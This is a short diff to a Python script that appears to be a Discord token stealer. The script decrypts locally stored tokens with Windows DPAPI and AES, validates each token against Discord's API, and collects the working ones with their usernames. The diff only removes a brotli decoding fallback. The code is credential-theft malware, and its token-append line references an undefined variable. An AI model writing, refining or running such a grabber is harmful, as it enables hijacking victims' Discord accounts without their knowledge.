@@ -9,7 +9,6 @@ import os
 import re
 import base64
 import json
-import brotli
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
@@ -44,17 +43,12 @@ def fetch():
         
         return decryption_key
     
-    def reqJSON(req) -> dict:
-        try: return req.json()
-        except: return json.loads(brotli.decompress(req.content).decode("utf-8"))
-    
     def check_token(tkn, name, ids:list, to_return_tokens:list):
         r = request_client.get("https://discord.com/api/v9/users/@me", headers=build_headers("get", superprop=True, debugoptions=True, discordlocale=True, authorization=tkn, timezone=True))
         if r.status_code == 200:
             tknid = base64.b64decode((tkn.split('.')[0] + '===').encode('ascii')).decode('ascii')
             if (tknid+name) not in ids:
-                req = reqJSON(r)
-                to_return_tokens.append([token, f"{req['username']}#{req['discriminator']}", tknid, name])
+                to_return_tokens.append([token, f"{r.json()['username']}#{r.json()['discriminator']}", tknid, name])
                 ids.append(tknid+name)
 
         return ids, to_return_tokens
